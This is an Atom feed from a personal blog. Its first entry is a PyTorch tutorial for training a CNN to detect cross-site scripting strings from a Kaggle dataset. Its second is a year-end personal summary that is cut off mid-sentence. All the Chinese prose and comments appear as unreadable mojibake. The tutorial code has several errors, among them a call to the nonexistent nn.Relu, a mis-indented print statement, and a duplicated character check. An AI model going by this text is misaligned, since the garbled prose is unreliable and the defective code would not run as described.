<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2025-04-23T10:02:06.719Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>Elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNNæ£€æµ‹XSSæ”»å‡»(Pytorch)</title>
    <link href="elssm.github.io/2025/04/23/CNN%E6%A3%80%E6%B5%8BXSS%E6%94%BB%E5%87%BB-Pytorch/"/>
    <id>elssm.github.io/2025/04/23/CNNæ£€æµ‹XSSæ”»å‡»-Pytorch/</id>
    <published>2025-04-23T13:08:36.000Z</published>
    <updated>2025-04-23T10:02:06.719Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¹‹å‰åœ¨Kaggleä¸Šçœ‹åˆ°äº†ä¸€ä¸ªXSSçš„æ•°æ®é›†ï¼Œæ‰€ä»¥æƒ³ç€ç”¨pytorchå®ç°ä¸€ä¸‹ï¼Œä»£ç å‚è€ƒäº†kaggleä¸Šæœ‰äººç”¨keraså®ç°çš„ã€‚</p><p><a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn</a></p><h3 id="XSSæ•°æ®é›†ä»‹ç»"><a href="#XSSæ•°æ®é›†ä»‹ç»" class="headerlink" title="XSSæ•°æ®é›†ä»‹ç»"></a>XSSæ•°æ®é›†ä»‹ç»</h3><p>æ•°æ®é›†åœ°å€ï¼š<a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning</a></p><p>æ•°æ®æ˜¯csvå½¢å¼çš„ï¼Œä¸€å…±æœ‰ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—æ˜¯åºå·ï¼Œç¬¬äºŒåˆ—æ˜¯å…·ä½“çš„ä»£ç ï¼Œç¬¬ä¸‰åˆ—æ˜¯æ ‡ç­¾ã€‚ä¸€å…±æœ‰13686æ¡æ•°æ®ï¼Œæ²¡æœ‰åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†ï¼Œå› æ­¤åé¢æˆ‘ä»¬éœ€è¦åˆ†ä¸€ä¸‹ã€‚</p><h4 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h4><p>é¦–å…ˆæˆ‘ä»¬åº”è¯¥å¯¹æ•°æ®è¿›è¡Œç¼–ç ã€‚è½¬æ¢æˆå‘é‡çš„å½¢å¼ï¼Œå¯¹äºè®­ç»ƒé›†å’Œæµ‹è¯•é›†æ¯ä¸€è¡Œæ•°æ®ï¼Œæˆ‘ä»¬éƒ½æœ‰ç¼–ç å’Œæ ‡ç­¾ä¸¤ç§æ•°æ®ï¼Œä¹‹åé€šè¿‡æ¨¡å‹è¿›è¡Œè®­ç»ƒï¼Œè®­ç»ƒç»“æœä¸æ ‡ç­¾è¿›è¡Œæ¯”å¯¹ï¼Œè®¡ç®—æŸå¤±ï¼Œæœ€åé€šè¿‡æµ‹è¯•é›†è¿›è¡ŒéªŒè¯ã€‚</p><h4 id="æ¨¡å—å¯¼å…¥"><a href="#æ¨¡å—å¯¼å…¥" class="headerlink" title="æ¨¡å—å¯¼å…¥"></a>æ¨¡å—å¯¼å…¥</h4><p>å…¶ä¸­cv2æ˜¯ä¸€ä¸ªè¿›è¡Œå›¾åƒå¤„ç†çš„åº“ï¼Œsklearnæ˜¯åŸºäºpythonçš„æœºå™¨å­¦ä¹ æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°å®šä¹‰"><a href="#å‚æ•°å®šä¹‰" class="headerlink" title="å‚æ•°å®šä¹‰"></a>å‚æ•°å®šä¹‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">50</span></span><br><span class="line">epochs = <span class="number">100</span></span><br></pre></td></tr></table></figure><h4 id="åŠ è½½æ•°æ®é›†"><a href="#åŠ è½½æ•°æ®é›†" class="headerlink" title="åŠ è½½æ•°æ®é›†"></a>åŠ è½½æ•°æ®é›†</h4><p>å°†XSSæ•°æ®é›†ä¸‹è½½ä¹‹åï¼Œæ”¾åœ¨å’Œä»£ç åŒçº§çš„ç›®å½•ä¸‹ã€‚é€šè¿‡pandasæ¨¡å—å¯ä»¥å®ç°å¯¹csvæ–‡ä»¶çš„è¯»å–ç­‰æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_csv(<span class="string">"XSS_dataset.csv"</span>,encoding=<span class="string">"utf-8-sig"</span>)</span><br><span class="line">sentences = df[<span class="string">'Sentence'</span>].values</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰ç¼–ç å‡½æ•°"><a href="#å®šä¹‰ç¼–ç å‡½æ•°" class="headerlink" title="å®šä¹‰ç¼–ç å‡½æ•°"></a>å®šä¹‰ç¼–ç å‡½æ•°</h4><p>å¯¹äºä¸€äº›ç¼–ç åæ¯”è¾ƒå¤§çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºä»–ä»¬åˆ†é…ä¸€ä¸ªæ¯”è¾ƒå°çš„å€¼ï¼Œæ–¹ä¾¿åç»­è¿›è¡Œæ­£åˆ™åŒ–ã€‚å°†æ¯ä¸€æ¡æ•°æ®éƒ½é€šè¿‡ä¸€ä¸ªé•¿åº¦ä¸º10000çš„å‘é‡è¿›è¡Œå­˜å‚¨ã€‚ä¹‹å<code>reshape</code>æˆä¸€ä¸ªäºŒç»´å‘é‡ï¼Œå¤§å°æ˜¯100*100</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_to_ascii</span><span class="params">(sentence)</span>:</span></span><br><span class="line">    sentence_ascii = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sentence:</span><br><span class="line">        <span class="keyword">if</span> (ord(i) &lt; <span class="number">8222</span>):  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8221</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">129</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8220</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8216</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">132</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8211</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">133</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) &lt;= <span class="number">128</span>):</span><br><span class="line">                sentence_ascii.append(ord(i))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    zer = np.zeros((<span class="number">10000</span>)) <span class="comment">#åˆå§‹åŒ–ä¸€ä¸ªé•¿åº¦ä¸º10000çš„å‘é‡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentence_ascii)):</span><br><span class="line">        zer[i] = sentence_ascii[i]</span><br><span class="line">    zer.shape = (<span class="number">100</span>, <span class="number">100</span>) <span class="comment">#å°†ä¸€ç»´è½¬ä¸ºäºŒç»´</span></span><br><span class="line">    <span class="keyword">return</span> zer</span><br></pre></td></tr></table></figure><h4 id="ç¼–ç è½¬æ¢"><a href="#ç¼–ç è½¬æ¢" class="headerlink" title="ç¼–ç è½¬æ¢"></a>ç¼–ç è½¬æ¢</h4><p>é¦–å…ˆå®šä¸€ä¸ªæ•°ç»„ï¼Œå¤§å°æ˜¯æ•°æ®é›†çš„é•¿åº¦ï¼Œç±»å‹æ˜¯ä¸€ä¸ªäºŒç»´å‘é‡ï¼Œå¤§å°æ˜¯100*100ï¼Œä¹‹åå¯¹csvä¸­æ¯ä¸€æ¡æ•°æ®éƒ½è¿›è¡Œç¼–ç è½¬æ¢ï¼Œå¹¶å°†äºŒç»´å‘é‡ä¸­çš„æ•°æ®éƒ½è½¬ä¸ºfloatç±»å‹è¡¨ç¤ºã€‚ä¹‹åå¾—åˆ°çš„dataå°±æ˜¯å¯¹æ•°æ®é›†ç¼–ç åçš„ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr = np.zeros((len(sentences), <span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentences)):</span><br><span class="line">    image = convert_to_ascii(sentences[i])</span><br><span class="line"></span><br><span class="line">    x = np.asarray(image, dtype=<span class="string">'float'</span>) <span class="comment">#å°†äºŒç»´é‡Œçš„æ•°æ®ç±»å‹è½¬ä¸ºfloatå‹</span></span><br><span class="line">    image = cv2.resize(x, dsize=(<span class="number">100</span>, <span class="number">100</span>), interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    image /= <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    arr[i] = image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reshape data for input to CNN</span></span><br><span class="line">data = arr.reshape(arr.shape[<span class="number">0</span>],<span class="number">1</span>,<span class="number">100</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="è·å–æ ‡ç­¾"><a href="#è·å–æ ‡ç­¾" class="headerlink" title="è·å–æ ‡ç­¾"></a>è·å–æ ‡ç­¾</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y=df[<span class="string">'Label'</span>].values</span><br></pre></td></tr></table></figure><h4 id="åˆ’åˆ†æ•°æ®é›†"><a href="#åˆ’åˆ†æ•°æ®é›†" class="headerlink" title="åˆ’åˆ†æ•°æ®é›†"></a>åˆ’åˆ†æ•°æ®é›†</h4><p>é‡‡ç”¨<code>train_test_split</code>å‡½æ•°éšæœºåˆ’åˆ†æ•°æ®ã€‚å…¶ä¸­<code>test_size</code>æ˜¯æŒ‡æµ‹è¯•æ•°æ®å æ ·æœ¬æ•°æ®çš„æ¯”ä¾‹ï¼Œè¿™é‡Œå–æ ·æœ¬æ€»æ•°çš„20%ä½œä¸ºæµ‹è¯•æ•°æ®ï¼Œ<code>random_state</code>æ˜¯ä¸€ä¸ªéšæœºæ•°ç§å­ã€‚ä¹‹åé€šè¿‡<code>DataLoader</code>å‡½æ•°è®¾å®šè®­ç»ƒæ‰¹æ¬¡å¤§å°å’Œ<code>shuffle</code>æ“ä½œï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæˆ‘ä»¬dataå’Œyä¸­çš„æ•°æ®éƒ½æ˜¯<code>ndarray</code>ç±»å‹çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å¯¹ä»–ä»¬è¿›è¡Œç±»å‹è½¬æ¢ï¼Œè½¬ä¸º<code>tensor</code>ç±»å‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trainX, testX, trainY, testY = train_test_split(data,y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">trainX = torch.from_numpy(trainX)</span><br><span class="line">trainX = DataLoader(trainX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testX = torch.from_numpy(testX)</span><br><span class="line">testX = DataLoader(testX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">trainY = torch.from_numpy(trainY)</span><br><span class="line">trainY = DataLoader(trainY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testY = torch.from_numpy(testY)</span><br><span class="line">testY = DataLoader(testY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="æ¨¡å‹å®šä¹‰"><a href="#æ¨¡å‹å®šä¹‰" class="headerlink" title="æ¨¡å‹å®šä¹‰"></a>æ¨¡å‹å®šä¹‰</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNN_XSS_Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(CNN_XSS_Net, self).__init__()</span><br><span class="line">        self.cnn = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>,<span class="number">64</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>,<span class="number">128</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Conv2d(<span class="number">128</span>,<span class="number">256</span>,<span class="number">3</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Relu(),</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">123904</span>,<span class="number">256</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">256</span>,<span class="number">128</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        self.fc4 = nn.Linear(<span class="number">64</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self,x)</span>:</span></span><br><span class="line">        x = torch.tensor(x, dtype=torch.float32)</span><br><span class="line">        cnn_res = self.cnn(x)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*256*22*22</span></span><br><span class="line">        cnn_res = cnn_res.view(cnn_res.size(<span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*123904</span></span><br><span class="line">        f1 = self.fc1(cnn_res)</span><br><span class="line">        f2 = self.fc2(f1)</span><br><span class="line">        f3 = self.fc3(f2)</span><br><span class="line">        f4 = self.fc4(f3)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f4</span><br></pre></td></tr></table></figure><h4 id="å®ä¾‹åŒ–æ¨¡å‹"><a href="#å®ä¾‹åŒ–æ¨¡å‹" class="headerlink" title="å®ä¾‹åŒ–æ¨¡å‹"></a>å®ä¾‹åŒ–æ¨¡å‹</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">model = CNN_XSS_Net()</span><br><span class="line">optimizer = optim.Adam(model.parameters(),<span class="number">0.001</span>)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰è®­ç»ƒå‡½æ•°"><a href="#å®šä¹‰è®­ç»ƒå‡½æ•°" class="headerlink" title="å®šä¹‰è®­ç»ƒå‡½æ•°"></a>å®šä¹‰è®­ç»ƒå‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(model,trainX,trainY,optimizer,epochs)</span>:</span></span><br><span class="line">    model.train()</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> data, target <span class="keyword">in</span> zip(trainX,trainY):</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        output = model(data)</span><br><span class="line">        loss = criterion(output, target)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Train Epoch : &#123;&#125; \t Loss : &#123;:.6f&#125;"</span>.format(epochs, loss.item()))</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰æµ‹è¯•å‡½æ•°"><a href="#å®šä¹‰æµ‹è¯•å‡½æ•°" class="headerlink" title="å®šä¹‰æµ‹è¯•å‡½æ•°"></a>å®šä¹‰æµ‹è¯•å‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_model</span><span class="params">(model,testX,testY)</span>:</span></span><br><span class="line">    model.eval()</span><br><span class="line">    correct = <span class="number">0.0</span></span><br><span class="line">    test_loss = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> data,target <span class="keyword">in</span> zip(testX,testY):</span><br><span class="line">            output = model(data)</span><br><span class="line">            test_loss+=F.cross_entropy(output,target).item()</span><br><span class="line">            pred = output.max(<span class="number">1</span>,keepdim=<span class="literal">True</span>)[<span class="number">1</span>] </span><br><span class="line">            correct += pred.eq(target.view_as(pred)).sum().item()</span><br><span class="line">        test_loss /= len(testX.dataset)</span><br><span class="line">        print(<span class="string">"Test ---- Average loss : &#123;:.4f&#125;,Accuracy : &#123;:.3f&#125;\n"</span>.format(test_loss,<span class="number">100.0</span>*correct/len(testX.dataset)))</span><br></pre></td></tr></table></figure><h4 id="æ¨¡å‹è®­ç»ƒ"><a href="#æ¨¡å‹è®­ç»ƒ" class="headerlink" title="æ¨¡å‹è®­ç»ƒ"></a>æ¨¡å‹è®­ç»ƒ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(epochs):</span><br><span class="line">    train(model,trainX,trainY,optimizer,epoch)</span><br><span class="line">    test_model(model,testX,testY)</span><br></pre></td></tr></table></figure><h4 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h4><p><img src="/2025/04/23/CNNæ£€æµ‹XSSæ”»å‡»-Pytorch/1.png" alt="1"></p><p><img src="/2025/04/23/CNNæ£€æµ‹XSSæ”»å‡»-Pytorch/2.png" alt="2"></p><p><img src="/2025/04/23/CNNæ£€æµ‹XSSæ”»å‡»-Pytorch/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;ä¹‹å‰åœ¨Kaggleä¸Šçœ‹åˆ°äº†ä¸€ä¸ªXSSçš„æ•°æ®é›†ï¼Œæ‰€ä»¥æƒ³ç€ç”¨pytorchå®ç°ä¸€ä¸‹ï¼Œä»£ç å‚è€ƒäº†kaggleä¸Šæœ‰äººç”¨keraså®ç°çš„ã€‚&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="ML" scheme="elssm.github.io/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´ç»ˆæ€»ç»“</title>
    <link href="elssm.github.io/2024/12/18/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>elssm.github.io/2024/12/18/2024å¹´ç»ˆæ€»ç»“/</id>
    <published>2024-12-18T14:46:20.000Z</published>
    <updated>2024-12-26T03:20:52.139Z</updated>
    
    <content type="html"><![CDATA[<p>çªç„¶å‘ç°å·²ç»ä¸€å¹´å¤šæ²¡æœ‰æ›´æ–°åšå®¢äº†ã€‚</p><p>å…¶å®è¿™ç§å¹´ç»ˆæ€»ç»“æˆ‘ä¸€ç›´å°±æƒ³å»å†™ã€‚å› ä¸ºæ¯åˆ°å¹´åº•ï¼Œå°±ä¼šæœ‰å„ç§å„æ ·APPçš„å¹´ç»ˆæ€»ç»“å‡ºç°ï¼Œè¿™äº›æ€»ç»“å¯ä»¥å¿«é€Ÿçš„å¸¦æˆ‘è¿‡å®Œè¿™ä¸€å¹´åœ¨è¿™æ¬¾APPä¸Šåšäº†äº›ä»€ä¹ˆäº‹æƒ…ï¼ŒAPPä¸Šçš„æŸä¸€ä¸ªæ€»ç»“ç‚¹ä¼šè¿…é€Ÿåœ°å°†æˆ‘æ‹‰å›åˆ°ä¸€å¹´ä¸­çš„æŸä¸ªæ—¶åˆ»ï¼Œè¯´çœŸçš„ï¼Œæˆ‘å¾ˆå–œæ¬¢è¿™æ ·çš„æ„Ÿè§‰ã€‚</p><p>ä¸ºä½•è‡ªå·±ä¸€ç›´è¿Ÿè¿Ÿæ²¡æœ‰å†™è‡ªå·±çš„å¹´ç»ˆæ€»ç»“å‘¢ï¼Œå¯èƒ½è¿˜æ˜¯è§‰å¾—æ²¡ä»€ä¹ˆå€¼å¾—è®°å½•çš„å§ï¼Ÿä½†æ˜¯ç°åœ¨å·¥ä½œä¹‹åï¼Œæ¯å¹´å¹´åº•ï¼Œæˆ‘ä»¬éƒ½è¦åšå¹´ç»ˆæ€»ç»“æ±‡æŠ¥ï¼Œå›é¡¾è¿™ä¸€å¹´å·¥ä½œä¸Šçš„ç‚¹ç‚¹æ»´æ»´ï¼Œå±•ç°è‡ªå·±è¿™ä¸€å¹´çš„å·¥ä½œä¸šç»©ï¼Œæˆ‘è§‰å¾—è¿™æ˜¯å¥½äº‹ï¼Œå¯ä»¥æ›´å¥½çš„æ¿€åŠ±è‡ªå·±ã€åæ€è‡ªå·±ã€‚å› æ­¤ï¼Œåœ¨2024å¹´ï¼Œæˆ‘ä¹Ÿæƒ³å®Œæˆè‡ªå·±çš„å¹´ç»ˆæ€»ç»“blogï¼Œä¹Ÿç®—æ˜¯ä¸ºè‡ªå·±2025å¹´å¼€ä¸€ä¸ªå¥½å¤´ï¼Œè¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡å¹´ç»ˆæ€»ç»“ï¼Œå¸Œæœ›ä¸ä¼šæ˜¯æœ€åä¸€ç¯‡ï¼Œå“ˆå“ˆå“ˆã€‚</p><p>è¿™ç¯‡å¹´ç»ˆæ€»ç»“ï¼Œæˆ‘æƒ³åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†æ¦‚æ‹¬ï¼Œåˆ†åˆ«æ˜¯å·¥ä½œï¼Œæ¯•ç«Ÿå·¥ä½œæ—¶é—´å äº†æˆ‘ä¸€å¹´çš„80%ï¼›æ—…è¡Œï¼Œåœ¨ä¸€å¹´ä¸­ç©¿æ’ç€çš„å‡ ä¸ªå°é•¿å‡æœŸé—´çš„æ—…æ¸¸æˆäº†ä¸å¯å¤šå¾—çš„ä¸€ç§æ”¾ç©ºæ–¹å¼ï¼›èŠ±é’±ï¼ŒæŒ£é’±å°±æ˜¯ä¸ºäº†èŠ±é’±ï¼Œå¯ç‰¹ä¹ˆå°±æ˜¯æ”’ä¸ä½é’±ï¼›çˆ±æƒ…ï¼Œä»Šå¹´åœ¨çˆ±æƒ…è·¯ä¸Šä¹Ÿç®—æ˜¯è¿ˆå…¥äº†æ–°çš„é˜¶æ®µï¼›å­¦ä¹ ï¼Œä¸»è¦æä¸€äº›å·¥ä½œä¹‹å¤–çš„æ­£èƒ½é‡ã€‚</p><h3 id="å·¥ä½œ"><a href="#å·¥ä½œ" class="headerlink" title="å·¥ä½œ"></a>å·¥ä½œ</h3><p>2024å¹´æ˜¯æ­£å¼è·¨å…¥èŒåœºçš„ä¸€å¹´ï¼Œè¿™ä¸€å¹´å®Œæˆäº†ä»<strong>å­¦ç”Ÿèº«ä»½</strong>åˆ°<strong>èŒåœºæ‰“å·¥äºº</strong>çš„è½¬å˜ã€‚</p><p>2023å¹´çš„å°±ä¸šå½¢åŠ¿å¹¶æ²¡æœ‰å¤šä¹è§‚ï¼Œæˆ‘å¾ˆåº†å¹¸çš„æ˜¯ï¼Œæœ€ç»ˆå…¥èŒäº†ä¸€å®¶ç¬¦åˆé¢„æœŸçš„å…¬å¸ã€‚</p><p>æˆ‘åœ¨å…¬å¸é‡Œåšçš„æ˜¯æˆ‘æ‰€å–œæ¬¢çš„äº‹æƒ…ï¼Œå…¶ä¸€æ˜¯å®ƒè·Ÿæˆ‘çš„ä¸“ä¸šç›¸å…³ï¼Œå…¶äºŒæ˜¯åœ¨æ­£å¼å·¥ä½œä¹‹å‰ï¼Œæˆ‘å·²ç»æœ‰äº†ä¸‰æ®µå®ä¹ ç»å†ï¼Œè¿™è¶³ä»¥è®©æˆ‘å¿«é€Ÿé€‚åº”å·¥ä½œã€‚</p><p>ç›®å‰æˆ‘åœ¨ç”²æ–¹ä»äº‹å®‰å…¨å¼€å‘å’Œå®‰å…¨è¿è¥å·¥ä½œï¼Œåœ¨è¿™ä¹‹å‰ï¼Œæˆ‘éƒ½æ˜¯åœ¨ä¹™æ–¹å…¬å¸å®ä¹ 